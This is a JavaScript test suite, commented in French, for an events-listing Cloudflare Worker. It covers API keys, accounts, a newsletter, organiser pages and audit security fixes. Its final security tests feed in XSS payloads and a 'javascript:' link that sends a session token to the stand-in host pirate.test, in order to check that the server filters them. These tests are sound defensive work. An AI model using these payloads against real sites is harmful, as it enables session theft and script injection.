// Tests du serveur (Cloudflare Worker) sans réseau : stockage KV en mémoire, données lues dans le dépôt.
// Lancer : node --test tests/
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const RACINE = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const w = (await import(path.join(RACINE, "worker/worker.js"))).default;
const { viderLimites, motRefuse } = await import(path.join(RACINE, "worker/commun.js"));

const SITE = "https://site.test/";
globalThis.fetch = async (u) => {
  u = String(u);
  if (!u.startsWith(SITE)) throw new Error("réseau interdit pendant les tests : " + u);
  const f = path.join(RACINE, u.slice(SITE.length));
  if (!fs.existsSync(f)) return new Response("absent", { status: 404 });
  return new Response(fs.readFileSync(f));
};
function kv() {
  const m = new Map(); let ecritures = 0;
  return { m, get ecritures() { return ecritures; },
    async get(k, t) { const v = m.get(k); return v == null ? null : t === "json" ? JSON.parse(v) : v; },
    async put(k, v) { ecritures++; m.set(k, v); }, async delete(k) { m.delete(k); },
    async list({ prefix }) { return { keys: [...m.keys()].filter(k => k.startsWith(prefix)).map(name => ({ name })), list_complete: true }; } };
}
const CODE_TEST = "code-editeur-de-test";
const env = () => (viderLimites(), { DLC: kv(), ADMIN_TOKEN: CODE_TEST, SIGNATURE_KEY: "cle-de-signature-des-tests", ORIGINS: "https://site.test", DATA_URL: SITE + "data/", SITE_URL: SITE });
const appel = async (e, chemin, o = {}) => {
  const r = await w.fetch(new Request("https://api.test" + chemin, { method: o.method || (o.body ? "POST" : "GET"), headers: o.headers || {}, body: o.body ? JSON.stringify(o.body) : undefined }), e, { waitUntil() {} });
  const t = await r.text(); let j = null; try { j = JSON.parse(t); } catch (_) {}
  return { statut: r.status, j, t, h: r.headers };
};
const admin = { Authorization: "Bearer code-editeur-de-test", "Content-Type": "application/json" };
async function cle(e, reglages) { return (await appel(e, "/admin/cles", { headers: admin, body: Object.assign({ nom: "Test" }, reglages) })).j.cle; }

test("sans clé : 401 en JSON", async () => {
  const r = await appel(env(), "/v1/sorties?dep=03");
  assert.equal(r.statut, 401); assert.equal(r.j.erreur, "cle_invalide");
});

test("espace éditeur : mauvais code refusé, bon code accepté", async () => {
  const e = env();
  assert.equal((await appel(e, "/admin/cles", { headers: { Authorization: "Bearer faux" }, body: { nom: "x" } })).statut, 401);
  assert.match(await cle(e, {}), /^dlc_[0-9a-f]{36}$/);
});

test("sorties d'un département, format et licence", async () => {
  const e = env(), k = await cle(e, {});
  const r = await appel(e, "/v1/sorties?dep=03&limite=5", { headers: { "X-API-Key": k } });
  assert.equal(r.statut, 200); assert.ok(r.j.total > 0); assert.ok(r.j.resultats.length <= 5);
  for (const s of r.j.resultats) { assert.ok(s.id && s.titre && s.debut && s.commune); assert.equal(s.departement, "03"); }
  assert.match(r.j.licence, /Trucs à faire/);
});

test("position sans département : départements déduits, résultats triés par distance dans le rayon", async () => {
  const e = env(), k = await cle(e, {});
  const r = await appel(e, "/v1/sorties?lat=46.566&lon=3.333&rayon=15&tri=distance&limite=50&key=" + k);
  assert.equal(r.statut, 200); assert.ok(r.j.total > 0);
  const d = r.j.resultats.map(x => x.distance_km);
  assert.ok(d.every(x => x <= 15.05)); assert.deepEqual(d, [...d].sort((a, b) => a - b));
});

test("clé limitée : département et type hors réglages refusés, position hors zone refusée", async () => {
  const e = env(), k = await cle(e, { deps: "03", types: "brocante,musee" });
  assert.equal((await appel(e, "/v1/sorties?dep=75&key=" + k)).j.erreur, "departement_non_autorise");
  assert.equal((await appel(e, "/v1/sorties?type=sport&key=" + k)).j.erreur, "type_non_autorise");
  assert.equal((await appel(e, "/v1/sorties?lat=48.857&lon=2.352&rayon=10&key=" + k)).j.erreur, "hors_zone");
  const r = await appel(e, "/v1/sorties?key=" + k);
  assert.ok(r.j.resultats.every(x => x.type === "brocante" && x.departement === "03"));
});

test("clé limitée à une zone : rien hors du cercle", async () => {
  const e = env(), k = await cle(e, { zone: { lat: 46.566, lon: 3.333, rayon: 10, nom: "Moulins" } });
  const r = await appel(e, "/v1/lieux?limite=500&key=" + k);
  assert.equal(r.statut, 200); assert.ok(r.j.total > 0); assert.ok(r.j.resultats.every(x => x.distance_km <= 10.05));
});

test("sites autorisés : autre site refusé, site autorisé accepté", async () => {
  const e = env(), k = await cle(e, { deps: "03", origines: "https://www.ville.test" });
  assert.equal((await appel(e, "/v1/cle?key=" + k, { headers: { Origin: "https://pirate.test" } })).j.erreur, "origine_refusee");
  const ok = await appel(e, "/v1/cle?key=" + k, { headers: { Origin: "https://www.ville.test" } });
  assert.equal(ok.statut, 200); assert.equal(ok.h.get("Access-Control-Allow-Origin"), "https://www.ville.test");
});

test("quota : bloqué au-delà, et écritures KV regroupées", async () => {
  const e = env(), k = await cle(e, { deps: "03", quota: 30 }); const avant = e.DLC.ecritures;
  for (let i = 0; i < 30; i++) assert.equal((await appel(e, "/v1/cle?key=" + k)).statut, 200);
  assert.equal((await appel(e, "/v1/cle?key=" + k)).j.erreur, "quota_atteint");
  assert.ok(e.DLC.ecritures - avant <= 3, "trop d'écritures KV : " + (e.DLC.ecritures - avant));
});

test("clé révoquée puis réactivée", async () => {
  const e = env(), k = await cle(e, { deps: "03" });
  await appel(e, "/admin/cles/revoquer", { headers: admin, body: { cle: k } });
  assert.equal((await appel(e, "/v1/cle?key=" + k)).j.erreur, "cle_revoquee");
  await appel(e, "/admin/cles/reactiver", { headers: admin, body: { cle: k } });
  assert.equal((await appel(e, "/v1/cle?key=" + k)).statut, 200);
});

test("bibliothèque /v1/dlc.js servie avec l'adresse du serveur", async () => {
  const r = await appel(env(), "/v1/dlc.js?key=dlc_x");
  assert.equal(r.statut, 200); assert.match(r.h.get("Content-Type"), /javascript/);
  assert.ok(r.t.includes('"https://api.test"')); assert.ok(!r.t.includes("__DLC_API__"));
});

test("proposition, publication, agenda public, retrait", async () => {
  const e = env();
  const ev = { t: "Brocante de test", cat: "brocante", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33 };
  assert.equal((await appel(e, "/propose", { headers: { "Content-Type": "application/json" }, body: ev })).statut, 200);
  const att = (await appel(e, "/admin/list", { headers: admin })).j.propositions;
  assert.equal(att.length, 1);
  await appel(e, "/admin/publish", { headers: admin, body: { id: att[0].id, event: Object.assign({}, att[0]) } });
  assert.equal((await appel(e, "/agenda")).j.length, 1);
  await appel(e, "/admin/unpublish", { headers: admin, body: { id: att[0].id } });
  assert.equal((await appel(e, "/agenda")).j.length, 0);
});

test("propositions : mots grossiers refusés, champs obligatoires", async () => {
  const e = env(), h = { "Content-Type": "application/json" };
  assert.equal((await appel(e, "/propose", { headers: h, body: { t: "Soirée putain", s: "2099-01-01", w: "X", lat: 1, lon: 1 } })).statut, 422);
  assert.equal((await appel(e, "/propose", { headers: h, body: { t: "Sans date", w: "X" } })).statut, 400);
});

test("erreur interne : réponse JSON 500 avec CORS, jamais de page HTML", async () => {
  const e = env(); e.DLC.get = async () => { throw new Error("panne KV"); };
  const r = await appel(e, "/v1/sorties?dep=03&key=dlc_x");
  assert.equal(r.statut, 500); assert.equal(r.j.erreur, "erreur_serveur"); assert.ok(r.h.get("Access-Control-Allow-Origin"));
});

test("sortie proposée avec billetterie : champ « billetterie » dans l'API", async () => {
  const e = env(), k = await cle(e, {});
  const ev = { t: "Concert de test", cat: "spectacle", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33, b: "https://www.billetweb.fr/test" };
  await appel(e, "/propose", { headers: { "Content-Type": "application/json" }, body: ev });
  const att = (await appel(e, "/admin/list", { headers: admin })).j.propositions;
  assert.equal(att[0].b, "https://www.billetweb.fr/test");
  const r = await appel(e, "/v1/sorties?dep=03&limite=3&key=" + k);
  assert.ok(r.j.resultats.every(s => "billetterie" in s));
});

/* ---------- Comptes ---------- */
const { signature } = await import(path.join(RACINE, "worker/comptes.js"));
const envC = () => Object.assign(env(), { MODE_TEST: "1" });
const jsonH = { "Content-Type": "application/json" };
async function inscrire(e, email, extra) {
  const r = await appel(e, "/compte/lien", { headers: jsonH, body: Object.assign({ email, cgu: true }, extra || {}) });
  const jeton = r.j.lien.split("#connexion=")[1];
  return (await appel(e, "/compte/connexion", { headers: jsonH, body: { jeton } })).j;
}

test("comptes : sans CGU rien n'est envoyé, e-mail vérifié, sans service d'envoi = 503 propre", async () => {
  const e0 = envC(), r0 = await appel(e0, "/compte/lien", { headers: jsonH, body: { email: "a@b.fr" } });
  assert.deepEqual(r0.j, { ok: true }); assert.ok(![...e0.DLC.m.keys()].some(k => k.startsWith("jet:")), "aucun lien créé sans CGU");
  assert.equal((await appel(envC(), "/compte/lien", { headers: jsonH, body: { email: "pas-un-mail", cgu: true } })).j.erreur, "email_invalide");
  assert.equal((await appel(env(), "/compte/lien", { headers: jsonH, body: { email: "a@b.fr", cgu: true } })).statut, 503);
});

test("comptes : inscription par lien, double opt-in newsletter, lien à usage unique", async () => {
  const e = envC();
  const r = await appel(e, "/compte/lien", { headers: jsonH, body: { email: "Lea@Exemple.fr", cgu: true, newsletter: true,
    prefs: { commune: { nom: "Moulins", dep: "03", lat: 46.5661234, lon: 3.3334 }, rayon: 40, cats: ["brocante", "inconnu"] }, fav: ["dt-1"] } });
  const jeton = r.j.lien.split("#connexion=")[1];
  assert.equal(e.DLC.m.size > 0 && [...e.DLC.m.keys()].some(k => k.startsWith("cpt:")), false, "aucun compte avant le clic");
  assert.ok(![...e.DLC.m.keys()].some(k => k.includes(jeton)), "jeton jamais stocké en clair");
  const c = (await appel(e, "/compte/connexion", { headers: jsonH, body: { jeton } })).j;
  assert.equal(c.nouveau, true); assert.equal(c.compte.email, "lea@exemple.fr"); assert.equal(c.compte.newsletter, true);
  assert.equal(c.compte.prefs.rayon, 40); assert.deepEqual(c.compte.prefs.cats, ["brocante"]); assert.equal(c.compte.prefs.commune.lat, 46.566);
  assert.deepEqual(c.compte.fav, ["dt-1"]);
  assert.equal((await appel(e, "/compte/connexion", { headers: jsonH, body: { jeton } })).j.erreur, "lien_expire");
});

test("comptes : profil, retrait du consentement tracé, export, désinscription signée, suppression", async () => {
  const e = envC(), c = await inscrire(e, "tom@exemple.fr", { newsletter: true });
  const auth = { Authorization: "Bearer " + c.session, "Content-Type": "application/json" };
  assert.equal((await appel(e, "/compte")).statut, 401);
  const m = await appel(e, "/compte", { headers: auth, body: { newsletter: false, fav: ["a", "a", "b"], prefs: { rayon: 500 } } });
  assert.equal(m.j.compte.newsletter, false); assert.deepEqual(m.j.compte.fav, ["a", "b"]); assert.equal(m.j.compte.prefs.rayon, 100);
  const x = await appel(e, "/compte/export", { headers: auth });
  assert.deepEqual(x.j.compte.consentements.map(k => k.action), ["accord", "retrait"]); assert.ok(!("sessions" in x.j.compte));
  await appel(e, "/compte", { headers: auth, body: { newsletter: true } });
  const id = x.j.compte.id;
  assert.match((await appel(e, "/newsletter/stop?c=" + id + "&s=faux")).t, /invalide/);
  const stop = "/newsletter/stop?c=" + id + "&s=" + await signature(e, id);
  assert.match((await appel(e, stop)).t, /<form method="post"/, "GET : simple confirmation");
  assert.equal((await appel(e, "/compte", { headers: auth })).j.compte.newsletter, true, "un GET (antivirus de messagerie) ne désinscrit pas");
  assert.match((await appel(e, stop, { method: "POST" })).t, /désinscrit/);
  assert.equal((await appel(e, "/compte", { headers: auth })).j.compte.newsletter, false);
  await appel(e, "/compte/supprimer", { headers: auth, body: {} });
  assert.equal((await appel(e, "/compte", { headers: auth })).statut, 401);
  assert.ok(![...e.DLC.m.keys()].some(k => k.startsWith("cpt:") || k.startsWith("ses:")), "tout est effacé");
});

test("comptes : trop de demandes de lien refusées", async () => {
  const e = envC(); let dernier;
  for (let i = 0; i < 5; i++) dernier = await appel(e, "/compte/lien", { headers: jsonH, body: { email: "x@exemple.fr", cgu: true } });
  assert.equal(dernier.statut, 429);
});

test("comptes : suppression automatique après 3 ans sans connexion", async () => {
  const { purgerInactifs } = await import(path.join(RACINE, "worker/comptes.js"));
  const e = envC(); await inscrire(e, "actif@exemple.fr"); await inscrire(e, "ancien@exemple.fr");
  for (const [k, v] of e.DLC.m) if (k.startsWith("cpt:") && v.includes("ancien")) { const c = JSON.parse(v); c.vu = "2020-01-01"; e.DLC.m.set(k, JSON.stringify(c)); }
  assert.equal(await purgerInactifs(e), 1);
  assert.equal([...e.DLC.m.keys()].filter(k => k.startsWith("cpt:")).length, 1);
});

test("organisateurs : page publique, logo, publication directe, pastille vérifiée, suppression du compte", async () => {
  const e = envC(), c = await inscrire(e, "comite@exemple.fr");
  const auth = { Authorization: "Bearer " + c.session, "Content-Type": "application/json" };
  assert.equal((await appel(e, "/compte/sorties", { headers: auth, body: { t: "Test" } })).j.erreur, "pas_de_profil");
  const r = await appel(e, "/compte/org", { headers: auth, body: { nom: "Comité des fêtes de Décize", bio: "Fêtes et brocantes", site: "www.comite.fr", insta: "https://instagram.com/comite_decize" } });
  const o = r.j.compte.org;
  assert.equal(o.slug, "comite-des-fetes-de-decize"); assert.equal(o.site, "https://www.comite.fr"); assert.equal(o.insta, "comite_decize"); assert.equal(o.verifie, false);
  assert.equal((await appel(e, "/compte/org/logo", { headers: auth, body: { image: "data:text/html;base64,AAAA" } })).statut, 400);
  assert.equal((await appel(e, "/compte/org/logo", { headers: auth, body: { image: "data:image/png;base64,iVBORw0KGgo=" } })).j.compte.org.logo, 1);
  const lg = await appel(e, "/org/" + o.slug + "/logo"); assert.equal(lg.statut, 200); assert.equal(lg.h.get("Content-Type"), "image/png");
  const pub = await appel(e, "/compte/sorties", { headers: auth, body: { t: "Brocante du comité", cat: "brocante", s: "2099-05-01", w: "Decize", z: "58", lat: 46.83, lon: 3.46, b: "https://www.helloasso.com/x" } });
  assert.equal(pub.j.sortie.org, o.slug); assert.equal(pub.j.sortie.src, "Publié par Comité des fêtes de Décize");
  assert.equal((await appel(e, "/agenda")).j.filter(x => x.org === o.slug).length, 1, "publiée sans relecture");
  const profil = await appel(e, "/org/" + o.slug); assert.equal(profil.j.org.nom, "Comité des fêtes de Décize"); assert.equal(profil.j.sorties.length, 1);
  assert.equal((await appel(e, "/admin/org/verifier", { headers: admin, body: { slug: o.slug } })).j.org.verifie, true);
  assert.equal((await appel(e, "/orgs")).j[0].verifie, true);
  assert.equal((await appel(e, "/compte", { headers: auth })).j.compte.org.verifie, true);
  await appel(e, "/compte/supprimer", { headers: auth, body: {} });
  assert.equal((await appel(e, "/org/" + o.slug)).statut, 404); assert.equal((await appel(e, "/agenda")).j.length, 0); assert.deepEqual((await appel(e, "/orgs")).j, []);
});

test("signalements : envoi par un visiteur, visible par l'éditeur, puis traité", async () => {
  const e = env(), h = { "Content-Type": "application/json" };
  assert.equal((await appel(e, "/signaler", { headers: h, body: { raison: "annule" } })).statut, 400);
  assert.equal((await appel(e, "/signaler", { headers: h, body: { sortie: "dt-1", titre: "Brocante", raison: "annule", note: "Annulée pour cause de pluie" } })).statut, 200);
  const l = (await appel(e, "/admin/list", { headers: admin })).j.signalements;
  assert.equal(l.length, 1); assert.equal(l[0].raison, "annule");
  await appel(e, "/admin/signalement", { headers: admin, body: { id: l[0].id } });
  assert.equal((await appel(e, "/admin/list", { headers: admin })).j.signalements.length, 0);
});

test("pré-remplissage depuis un lien : données schema.org Event, puis Open Graph", async () => {
  const { apercuLien } = await import(path.join(RACINE, "worker/comptes.js"));
  const vrai = globalThis.fetch;
  globalThis.fetch = async u => new Response(String(u).includes("ld") ?
    '<html><script type="application/ld+json">{"@context":"https://schema.org","@type":"Event","name":"Brocante d&#039;automne","startDate":"2099-10-25T07:00:00+02:00","location":{"@type":"Place","name":"Quai de Loire","address":{"addressLocality":"Decize"}},"offers":{"url":"https://www.billetweb.fr/x"},"description":"200 exposants"}</script></html>' :
    '<html><head><meta property="og:title" content="Concert au kiosque"><meta property="og:image" content="https://ex.fr/a.jpg"></head></html>', { headers: { "Content-Type": "text/html" } });
  try {
    const a = await apercuLien("https://exemple.fr/ld");
    assert.equal(a.t, "Brocante d'automne"); assert.equal(a.s, "2099-10-25"); assert.equal(a.h, "07:00"); assert.equal(a.w, "Decize"); assert.equal(a.lieu, "Quai de Loire"); assert.equal(a.b, "https://www.billetweb.fr/x");
    const b = await apercuLien("https://exemple.fr/og"); assert.equal(b.t, "Concert au kiosque"); assert.equal(b.img, "https://ex.fr/a.jpg");
    assert.equal(await apercuLien("http://exemple.fr/"), null); assert.equal(await apercuLien("https://127.0.0.1/"), null);
  } finally { globalThis.fetch = vrai; }
});

test("Le Truc de la semaine : sélection autour de la commune, e-mail, envoi par lots sans doublon", async () => {
  const nl = await import(path.join(RACINE, "worker/newsletter.js"));
  const sem = nl.semaine(new Date("2099-06-04T06:00:00Z"));  // un jeudi
  assert.deepEqual(sem, { du: "2099-06-05", au: "2099-06-11", edition: "2099-06-05" });
  const prefs = { commune: { nom: "Decize", lat: 46.83, lon: 3.46 }, rayon: 20, cats: [] };
  const ev = (id, s, lat, lon, x) => Object.assign({ id, t: "Truc " + id, cat: "fete", s, w: "Decize", z: "58", lat, lon }, x || {});
  const sorties = [ev("loin", "2099-06-06", 48.85, 2.35), ev("avant", "2099-06-01", 46.83, 3.46), ev("sam", "2099-06-06", 46.84, 3.47),
                   ev("mar", "2099-06-09", 46.83, 3.46, { h: "20:00" }), ev("expo", "2099-05-01", 46.83, 3.46, { e: "2099-09-01" })];
  const sel = nl.selection(sorties, prefs, sem);
  assert.deepEqual(sel.map(e => e.id), ["sam", "mar"]);
  const m = nl.courriel({ prefs }, sel, sem, { site: "https://site.test/", stop: "https://api.test/newsletter/stop?c=x&s=y", prefs: "https://site.test/#compte" });
  assert.match(m.sujet, /2 trucs à faire autour de Decize/); assert.ok(m.html.includes("Me désinscrire en un clic")); assert.ok(m.texte.includes("Truc sam"));
  // envoi : 2 abonnés avec commune, 1 sans accord ; Brevo simulé
  const e = Object.assign(envC(), { NL_LOT: "1", API_URL: "https://api.test" });
  const a = await inscrire(e, "a@exemple.fr", { newsletter: true, prefs: { commune: { nom: "Moulins", dep: "03", lat: 46.566, lon: 3.333 }, rayon: 40 } });
  await inscrire(e, "b@exemple.fr", { newsletter: true, prefs: { commune: { nom: "Moulins", dep: "03", lat: 46.566, lon: 3.333 } } });
  await inscrire(e, "c@exemple.fr", { newsletter: false, prefs: { commune: { nom: "Moulins", dep: "03", lat: 46.566, lon: 3.333 } } });
  e.BREVO_KEY = "k";
  const envoyes = [], vrai = globalThis.fetch;
  globalThis.fetch = async (u, o) => { if (String(u).includes("brevo")) { envoyes.push(JSON.parse(o.body)); return new Response("{}", { status: 201 }); } return vrai(u, o); };
  try {
    const jeudi = new Date();
    assert.equal(await nl.envoyerLot(e, jeudi), 1); assert.equal(await nl.envoyerLot(e, jeudi), 1); assert.equal(await nl.envoyerLot(e, jeudi), 0);
  } finally { globalThis.fetch = vrai; }
  assert.deepEqual(envoyes.map(x => x.to[0].email).sort(), ["a@exemple.fr", "b@exemple.fr"]);
  assert.equal(envoyes[0].headers["List-Unsubscribe-Post"], "List-Unsubscribe=One-Click");
  const ap = await appel(e, "/compte/newsletter", { headers: { Authorization: "Bearer " + a.session } });
  assert.equal(ap.statut, 200); assert.match(ap.t, /Le Truc de la semaine/);
});

/* ---------- Corrections de l'audit (octobre 2026) ---------- */
test("filtre de mots : mots entiers seulement (pique-nique, musique, technique passent)", () => {
  for (const ok of ["Pique-nique au bord de l'eau", "Soirée musique électronique", "Visite technique", "Concert unique à la Martinique",
                    "Fête de la Saint-Dominique", "Atelier salopettes", "La dispute des marmottes", "Computer club", "Spécial PDF"]) assert.equal(motRefuse(ok), false, ok);
  for (const ko of ["Soirée putain", "SALOPE", "bande de connards", "Merde alors", "nique ta mère", "Bâtard"]) assert.equal(motRefuse(ko), true, ko);
});

test("/compte/lien : même réponse que l'adresse ait un compte ou non", async () => {
  const e = envC(); await inscrire(e, "deja@exemple.fr");
  const a = await appel(e, "/compte/lien", { headers: jsonH, body: { email: "deja@exemple.fr" } });
  const b = await appel(e, "/compte/lien", { headers: jsonH, body: { email: "inconnu@exemple.fr" } });
  assert.equal(a.statut, b.statut); assert.equal(Object.keys(a.j).filter(k => k !== "lien").join(), Object.keys(b.j).join());
  const hors = Object.assign(envC(), {}); const r = await w.fetch(new Request("https://api.trucsafaire.fr/compte/lien", { method: "POST", headers: jsonH, body: JSON.stringify({ email: "z@exemple.fr", cgu: true }) }), hors, {});
  assert.ok(!(await r.json()).lien, "MODE_TEST sans effet hors d'une adresse de test");
});

test("sessions : aucune ne survit à la suppression du compte, « se déconnecter partout »", async () => {
  const e = envC(), sessions = [];
  for (let i = 0; i < 12; i++) { viderLimites(); sessions.push((await inscrire(e, "x@ex.fr")).session); }
  assert.ok([...e.DLC.m.keys()].filter(k => k.startsWith("ses:")).length <= 10, "les sessions évincées sont effacées");
  const auth = s => ({ Authorization: "Bearer " + s, "Content-Type": "application/json" });
  await appel(e, "/compte/supprimer", { headers: auth(sessions[11]), body: {} });
  viderLimites(); await inscrire(e, "x@ex.fr");  // même adresse, compte recréé
  for (const s of sessions) assert.equal((await appel(e, "/compte", { headers: auth(s) })).statut, 401);
  viderLimites(); const a = await inscrire(e, "x@ex.fr"); viderLimites(); const b = await inscrire(e, "x@ex.fr");
  await appel(e, "/compte/deconnexion", { headers: auth(a.session), body: { partout: true } });
  assert.equal((await appel(e, "/compte", { headers: auth(b.session) })).statut, 401);
});

async function organisateur(e, email, nom) {
  const c = await inscrire(e, email), auth = { Authorization: "Bearer " + c.session, "Content-Type": "application/json" };
  const o = (await appel(e, "/compte/org", { headers: auth, body: { nom } })).j.compte.org;
  const pub = await appel(e, "/compte/sorties", { headers: auth, body: { t: "Fête de " + nom, cat: "fete", s: "2099-05-01", w: "Decize", z: "58", lat: 46.83, lon: 3.46 } });
  return { auth, slug: o.slug, sortie: pub.j.sortie };
}

test("purge des comptes inactifs : page organisateur, logo et sorties effacés aussi", async () => {
  const { purgerInactifs } = await import(path.join(RACINE, "worker/comptes.js"));
  const e = envC(), o = await organisateur(e, "vieux@exemple.fr", "Comité test");
  for (const [k, v] of e.DLC.m) if (k.startsWith("cpt:")) { const c = JSON.parse(v); c.vu = "2020-01-01"; e.DLC.m.set(k, JSON.stringify(c)); }
  assert.equal(await purgerInactifs(e), 1);
  assert.deepEqual([...e.DLC.m.keys()].filter(k => /^(cpt|ses|org|logo|a):/.test(k)), []);
  assert.equal((await appel(e, "/org/" + o.slug)).statut, 404); assert.deepEqual((await appel(e, "/orgs")).j, []); assert.equal((await appel(e, "/agenda")).j.length, 0);
});

test("agenda mis à jour sans KV.list (cohérence) et sorties d'organisateur validées", async () => {
  const e = envC(), o = await organisateur(e, "a@exemple.fr", "Asso A");
  e.DLC.list = async () => ({ keys: [], list_complete: true });  // list() en retard : ne doit plus rien changer
  const p2 = await appel(e, "/compte/sorties", { headers: o.auth, body: { t: "Deuxième fête", cat: "fete", s: "2099-05-02", w: "Decize", z: "58", lat: 46.83, lon: 3.46 } });
  assert.equal(p2.statut, 200); assert.equal((await appel(e, "/agenda")).j.length, 2);
  for (const faux of [{ cat: "fete\" onmouseover=\"x" }, { z: "ZZZ" }, { lat: 999 }])
    assert.equal((await appel(e, "/compte/sorties", { headers: o.auth, body: Object.assign({ t: "Fête piégée", cat: "fete", s: "2099-05-02", w: "Decize", z: "58", lat: 46.83, lon: 3.46 }, faux) })).statut, 400, JSON.stringify(faux));
  assert.equal((await appel(e, "/compte/sorties", { headers: o.auth, body: { t: "Grand pique-nique", cat: "famille", s: "2099-05-03", w: "Decize", z: "58", lat: 46.83, lon: 3.46 } })).statut, 200);
  const x = await appel(e, "/compte/export", { headers: o.auth });
  assert.equal(x.j.page_organisateur.nom, "Asso A"); assert.equal(x.j.sorties_publiees.length, 3);
});

test("éditeur : suspendre puis rétablir, supprimer une page organisateur", async () => {
  const e = envC(), o = await organisateur(e, "abus@exemple.fr", "Mairie de Moulins");
  assert.equal((await appel(e, "/admin/org/suspendre", { headers: admin, body: { slug: o.slug, motif: "usurpation" } })).j.org.suspendu, true);
  assert.equal((await appel(e, "/org/" + o.slug)).statut, 404); assert.deepEqual((await appel(e, "/orgs")).j, []); assert.equal((await appel(e, "/agenda")).j.length, 0);
  assert.equal((await appel(e, "/compte/sorties", { headers: o.auth, body: { t: "Encore une", cat: "fete", s: "2099-05-02", w: "Decize", z: "58", lat: 46.83, lon: 3.46 } })).statut, 403);
  assert.equal((await appel(e, "/admin/orgs", { headers: admin })).j.orgs[0].suspendu, true);
  await appel(e, "/admin/org/suspendre", { headers: admin, body: { slug: o.slug, suspendu: false } });
  assert.equal((await appel(e, "/org/" + o.slug)).statut, 200); assert.equal((await appel(e, "/agenda")).j.length, 1);
  assert.equal((await appel(e, "/admin/org/supprimer", { headers: admin, body: { slug: o.slug } })).statut, 200);
  assert.equal((await appel(e, "/org/" + o.slug)).statut, 404); assert.equal((await appel(e, "/agenda")).j.length, 0);
  assert.equal((await appel(e, "/compte", { headers: o.auth })).j.compte.org, null, "le compte Trucophile reste, sans page");
});

test("liens signés : clé obligatoire, aperçu signé à part, code éditeur limité en essais", async () => {
  const e = envC(), c = await inscrire(e, "sig@exemple.fr"), id = (await appel(e, "/compte/export", { headers: { Authorization: "Bearer " + c.session } })).j.compte.id;
  const stop = "/newsletter/stop?c=" + id + "&s=" + await signature(e, id);
  assert.equal((await appel(e, "/newsletter/apercu?c=" + id + "&s=" + await signature(e, id))).statut, 403, "la signature de désinscription n'ouvre pas l'aperçu");
  assert.equal((await appel(e, "/newsletter/apercu?c=" + id + "&s=" + await signature(e, id, "vue"))).statut, 200);
  delete e.SIGNATURE_KEY;
  assert.equal((await appel(e, stop, { method: "POST" })).statut, 503);
  for (let i = 0; i < 10; i++) await appel(e, "/admin/list", { headers: { Authorization: "Bearer faux" } });
  assert.equal((await appel(e, "/admin/list", { headers: admin })).statut, 429, "bloqué après 10 essais ratés");
});

test("écritures KV : la limitation de débit n'écrit rien", async () => {
  const e = env(), h = { "Content-Type": "application/json" }, avant = e.DLC.ecritures;
  for (let i = 0; i < 20; i++) await appel(e, "/signaler", { headers: h, body: { raison: "autre" } });  // refusés (incomplets)
  assert.equal(e.DLC.ecritures - avant, 0);
});

test("Le Truc de la semaine : au plus 48 requêtes sortantes par lot, une écriture KV par lot, titres échappés", async () => {
  const nl = await import(path.join(RACINE, "worker/newsletter.js"));
  const e = Object.assign(envC(), { API_URL: "https://api.test" });
  const villes = [[46.566, 3.333], [48.857, 2.352], [43.296, 5.37], [45.764, 4.835], [47.218, -1.553], [43.604, 1.444], [50.629, 3.057], [48.573, 7.752], [44.837, -0.579], [47.322, 5.041]];
  for (let i = 0; i < 40; i++) { viderLimites(); const v = villes[i % villes.length];
    await inscrire(e, "n" + i + "@exemple.fr", { newsletter: true, prefs: { commune: { nom: "Ville" + i, dep: "03", lat: v[0], lon: v[1] }, rayon: 100 } }); }
  await appel(e, "/admin/publish", { headers: admin, body: { id: "x1", event: { t: "<img src=x onerror=alert(1)>", cat: "fete", s: new Date(Date.now() + 2 * 864e5).toISOString().slice(0, 10), w: "Moulins", z: "03", lat: 46.566, lon: 3.333 } } });
  e.BREVO_KEY = "k"; let requetes = 0; const envoyes = [], vrai = globalThis.fetch;
  globalThis.fetch = async (u, o) => { requetes++; if (String(u).includes("brevo")) { envoyes.push(JSON.parse(o.body)); return new Response("{}", { status: 201 }); } return vrai(u, o); };
  const ecr = e.DLC.ecritures; let n1;
  try { n1 = await nl.envoyerLot(e, new Date()); } finally { globalThis.fetch = vrai; }
  assert.ok(requetes <= 48, requetes + " requêtes sortantes"); assert.ok(n1 > 0);
  assert.ok(e.DLC.ecritures - ecr <= 2, (e.DLC.ecritures - ecr) + " écritures KV");
  const html = envoyes.map(x => x.htmlContent).join("");
  assert.ok(!html.includes("<img src=x"), "titre échappé"); assert.ok(html.includes("&lt;img") || !envoyes.length);
});

/* ---------- Sécurité (audit d'octobre 2026) ---------- */
test("sécurité : liens « javascript: » et images non https refusés dans les propositions", async () => {
  const e = env(), h = { "Content-Type": "application/json" };
  const ev = { t: "Fête piégée", cat: "fete", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33,
               u: "javascript:fetch('//pirate.test?'+localStorage.getItem('sbl-ses'))", b: " JaVaScRiPt:alert(1)", img: "http://pirate.test/x.png" };
  assert.equal((await appel(e, "/propose", { headers: h, body: ev })).statut, 200);
  assert.equal((await appel(e, "/propose", { headers: h, body: { type: "sources", url: "javascript:alert(1)" } })).statut, 400);
  assert.equal((await appel(e, "/propose", { headers: h, body: { type: "sources", url: "Comité des fêtes de Cercy-la-Tour" } })).statut, 200);
  const p = (await appel(e, "/admin/list", { headers: admin })).j.propositions[0];
  assert.equal(p.u, ""); assert.equal(p.b, ""); assert.equal(p.img, "");
});

test("sécurité : l'éditeur ne publie jamais un objet brut (liens, type, champs inconnus filtrés)", async () => {
  const e = env();
  const piege = { t: "Concert", cat: "fete", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33, u: "javascript:alert(1)",
                  b: "https://www.billetweb.fr/ok", img: "data:image/svg+xml,<svg onload=alert(1)>", script: "<script>alert(1)</script>", h: "20:00\"><b>" };
  assert.equal((await appel(e, "/admin/publish", { headers: admin, body: { id: "p-test1", event: piege } })).statut, 200);
  const a = (await appel(e, "/agenda")).j[0];
  assert.equal(a.u, undefined); assert.equal(a.img, undefined); assert.equal(a.script, undefined); assert.equal(a.h, undefined);
  assert.equal(a.b, "https://www.billetweb.fr/ok"); assert.equal(a.id, "p-test1");
  const r = await appel(e, "/admin/publish", { headers: admin, body: { id: "p-test2", event: Object.assign({}, piege, { cat: "fete');}</style><script>" }) } });
  assert.equal(r.statut, 400);
});

